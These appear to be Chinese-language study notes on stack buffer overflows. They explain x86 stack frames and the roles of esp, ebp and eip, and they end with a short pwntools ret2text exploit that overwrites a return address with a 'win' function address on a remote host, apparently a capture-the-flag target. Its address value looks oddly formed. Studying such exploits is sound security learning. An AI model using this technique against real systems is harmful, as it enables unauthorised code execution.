## 栈溢出
函数调用的栈帧
![image](https://pic3.zhimg.com/80/v2-8d5649c36458080223084d77abbd554a_1440w.webp)

函数状态主要涉及三个寄存器－－esp，ebp，eip。esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令

调用函数时栈的变化:
	被调用函数（callee）的参数按照逆序依次压入栈内 (arg n-arg 1)
	将调用函数（caller）进行调用之后的下一条指令地址作为返回地址压入栈内 (return addr)
	将调用函数的基地址（ebp）压入栈内，并将当前栈顶地址传到 ebp 寄存器内 (ebp)
	将被调用函数的局部变量压入栈内 (local var)

*python*
```python
from pwn import *
#local
#sh = process("./ret2text")
#remote
sh=remote('3.110.66.92',32075)
win = 0x4017E53
sh.sendline(b'A'*40 + p64(win))
sh.recvline()         
```





